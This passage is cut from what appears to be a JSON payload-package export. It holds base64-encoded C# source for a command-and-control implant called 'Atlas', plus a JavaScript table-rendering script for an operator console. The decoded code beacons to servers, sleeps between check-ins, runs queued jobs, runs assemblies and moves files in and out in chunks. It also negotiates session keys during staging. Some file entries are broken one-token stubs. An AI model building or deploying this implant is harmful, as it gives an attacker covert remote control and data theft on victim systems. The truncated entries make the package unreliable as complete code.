dGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgVXBsb2FkVGFza2luZyBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gVXBsb2FkVGFza2luZy5QYXJzZShtZXNzYWdlLCBVcGxvYWRUYXNraW5nRm9ybWF0KTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFVwbG9hZFRhc2tpbmcNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFzc2VtYmx5X2lkID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICByZW1vdGVfcGF0aCA9IHBhcnNlTGlzdFsxXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUnVuQXNzZW1ibHkNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhcmdzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXNzZW1ibHlfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSdW5Bc3NlbWJseUZvcm1hdCA9IEAiIiJhc3NlbWJseV9pZCIiOiAiInswfSIiLCAiImFyZ3MiIjogIiJ7MX0iIiI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxcIiwgQCIiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBSdW5Bc3NlbWJseSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gUnVuQXNzZW1ibHkuUGFyc2UobWVzc2FnZSwgUnVuQXNzZW1ibHlGb3JtYXQpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUnVuQXNzZW1ibHkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFyZ3MgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIGFzc2VtYmx5X2lkID0gcGFyc2VMaXN0WzBdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBVcGxvYWQNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19zaXplIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZ1bGxfcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIiY2h1bmtfc2l6ZSIiOnsxfSwiImZpbGVfaWQiIjoiInsyfSIiLCIiY2h1bmtfbnVtIiI6ezN9LCAiImZ1bGxfcGF0aCIiOiAiIns0fSIiLCIidGFza19pZCIiOiIiezV9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihVcGxvYWQgdXBsb2FkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICB1cGxvYWQuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuY2h1bmtfc2l6ZS5Ub1N0cmluZygpKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuZmlsZV9pZCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmNodW5rX251bS5Ub1N0cmluZygpKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuZnVsbF9wYXRoKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQudGFza19pZCkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBwdWJsaWMgY2xhc3MgVXBsb2FkUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCB0b3RhbF9jaHVua3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjaHVua19kYXRhIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcGxvYWRSZXNwb25zZUZvcm1hdCA9IEAie3siImFjdGlvbiIiOiAiInswfSIiLCAiInRvdGFsX2NodW5rcyIiOiB7MX0sICIiY2h1bmtfbnVtIiI6IHsyfSwgIiJjaHVua19kYXRhIiI6ICIiezN9IiIsICIiZmlsZV9pZCIiOiAiIns0fSIiLCAiInRhc2tfaWQiIjogIiJ7NX0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgQCJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezN9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInszfSIsICIoPydncm91cDMnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7NH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezR9IiwgIig\/J2dyb3VwNCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoIns1fSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7NX0iLCAiKD8nZ3JvdXA1Jy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwNCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDQiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDUiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXA1Il0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgVXBsb2FkUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFVwbG9hZFJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIFVwbG9hZFJlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgVXBsb2FkUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gSW50MzIuUGFyc2UocGFyc2VMaXN0WzFdKSwNCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSW50MzIuUGFyc2UocGFyc2VMaXN0WzJdKSwNCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IHBhcnNlTGlzdFszXSwNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFs0XSwNCiAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFs1XQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgRG93bmxvYWRSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHN0YXR1cyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRG93bmxvYWRSZXNwb25zZUZvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiImZpbGVfaWQiIjogIiJ7MX0iIiwgIiJ0YXNrX2lkIiI6ICIiezJ9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIERvd25sb2FkUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IERvd25sb2FkUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgRG93bmxvYWRSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDUpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IERvd25sb2FkUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0U3RhZ2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwdWJfa2V5IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJwdWJfa2V5IiI6IiJ7MX0iIiwiInNlc3Npb25faWQiIjoiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oR2V0U3RhZ2UgZ2V0X3N0YWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBnZXRfc3RhZ2UuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2UuYWN0aW9uKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfc3RhZ2UucHViX2tleSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLnNlc3Npb25faWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBTdGFnZVJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdXVpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25fa2V5IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc2Vzc2lvbl9pZCB7IGdldDsgc2V0OyB9DQoNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siInV1aWQiIjogIiJ7MH0iIiwgIiJzZXNzaW9uX2tleSIiOiAiInsxfSIiLCAiImFjdGlvbiIiOiAiInsyfSIiLCAiInNlc3Npb25faWQiIjogIiJ7M30iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgQCJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezN9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInszfSIsICIoPydncm91cDMnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDMiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgU3RhZ2VSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gU3RhZ2VSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBKc29uRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNCkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgU3RhZ2VSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzJdLA0KICAgICAgICAgICAgICAgICAgICB1dWlkID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX2tleSA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IHBhcnNlTGlzdFszXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQo="
        },
        {
          "Program.cs": "77u\/bmFtZXNwYWNlIEF0bGFzDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgVXRpbHMuR2V0U2VydmVycygpOw0KICAgICAgICAgICAgd2hpbGUgKCFIdHRwLkNoZWNrSW4oKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgRHdlbGwgPSBVdGlscy5HZXREd2VsbFRpbWUoKTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZC5TbGVlcChEd2VsbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBVdGlscy5Kb2JMaXN0IEpvYkxpc3QgPSBuZXcgVXRpbHMuSm9iTGlzdA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYl9jb3VudCA9IDAsDQogICAgICAgICAgICAgICAgam9icyA9IHsgfQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLkxvb3AoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgaW50IER3ZWxsID0gVXRpbHMuR2V0RHdlbGxUaW1lKCk7DQogICAgICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQuU2xlZXAoRHdlbGwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"
        },
        {
          "Http_4.0.cs": "77u\"
        },
        {
          "Modules.cs": "77u\"
        },
        {
          "Uuid.txt": "VVVJRF9IRVJF"
        }
      ],
      "support_scripts": [
        {
          "name": "create_table",
          "script": "ZnVuY3Rpb24oaGVhZGVycywgZGF0YSl7CiAgdmFyIG91dHB1dCA9ICI8dGFibGUgc3R5bGU9J292ZXJmbG93OnNjcm9sbDt3aGl0ZS1zcGFjZTpub3dyYXA7d2lkdGg6MTAwJTtjb2xvcjp3aGl0ZScgY2xhc3M9J3RhYmxlLXN0cmlwZWQgdGFibGUtaG92ZXIgYm9yZGVyIGJvcmRlci1kYXJrIHNoYWRvdyB0YWJsZS1jb25kZW5zZWQgdGFibGUtZGFyayc+IjsKICBvdXRwdXQgKz0gIjx0cj4iOwogIGZvcih2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgaSsrKXsKICAgIG91dHB1dCArPSAiPHRoIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiMzOTM0ODU7Y29sb3I6d2hpdGU7aGVpZ2h0OjQwcHg7dGV4dC1hbGlnbjpsZWZ0O3BhZGRpbmc6MHB4IDBweCAwcHggMjBweDt3aWR0aDoiICsgaGVhZGVyc1tpXVsnc2l6ZSddICsgIicgb25jbGljaz1cInNvcnRfdGFibGUodGhpcylcIj4iICsgaGVhZGVyc1tpXVsnbmFtZSddLnRvVXBwZXJDYXNlKCkgKyAiPC90aD4iOwogIH0KICBvdXRwdXQgKz0gIjwvdHI+IjsKICBmb3IodmFyIGkgPSAwOyBpIDwgZGF0YS5sZW5ndGg7IGkrKyl7CiAgICBvdXRwdXQgKz0gIjx0ciBzdHlsZT0ndGV4dC1hbGlnbjpsZWZ0OyIgKyBkYXRhW2ldWydyb3ctc3R5bGUnXSArICInPiI7CiAgICBmb3IodmFyIGogPSAwOyBqIDwgaGVhZGVycy5sZW5ndGg7IGorKyl7CiAgICAgaWYoZGF0YVtpXVsnY2VsbC1zdHlsZSddLmhhc093blByb3BlcnR5KGhlYWRlcnNbal0pKXsKICAgICAgICBvdXRwdXQgKz0gIjx0ZCBzdHlsZT0ncGFkZGluZzowcHggMHB4IDBweCAyMHB4OyIgKyBkYXRhW2ldWydjZWxsLXN0eWxlJ11baGVhZ